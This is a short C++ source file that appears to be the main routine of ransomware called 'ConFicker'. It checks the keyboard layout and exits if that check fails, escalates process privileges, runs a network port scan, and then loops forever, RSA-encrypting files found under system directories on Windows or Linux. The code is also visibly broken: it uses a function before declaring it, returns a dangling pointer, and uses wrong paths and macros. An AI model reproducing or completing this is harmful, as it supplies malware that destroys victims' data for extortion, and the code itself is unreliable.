#include <stdio.h>
#include <iostream>
#include <stdlib.h>
#include <filesystem>
#include "includes/Backdoor.hpp"
#include "includes/OSCheck.hpp"
#include "includes/Threads.hpp"
#include "includes/NetScan.hpp"

using namespace ConFicker;

int main()
{
    get_platform_name();


    const auto OSCheck = KBCheck::findKeyBoardLayout();

    if (OSCheck != 1)
    {
        exit(EXIT_FAILURE);
    } 
    else
    {
        const int breached = ConFicker::Sleeper::SetProcessPrivileges((std::string)("0"), true);

        if (breached == 1)
        {
            // Next we netscan
            const int isConnected = ConFicker::PortScanner::quickConnect();

            if (isConnected == 1)
            {
                // Iterate through the entire system
                do
                {
                    const char* File = FindFiles();
                    const auto& Encrypt = new ConFicker::Backdoor();
                    Encrypt->RsaEncrypt(File);
                } while (true);
            }
        }
    }
};

char* FindFiles()
{
    #if defined(_WIN32)
    std::string path = "C:\\System32";
    for (const auto& entry : std::filesystem::directory_iterator(path))
    {
        return entry.path().filename().c_str();
    }
    #endif
    #if defined(_linux_)
        std::string path = "/";
        for (const auto& entry : std::filesystem::directory_iterator(path))
        {
            return entry.path().filename().c_str();
        }
    #endif
}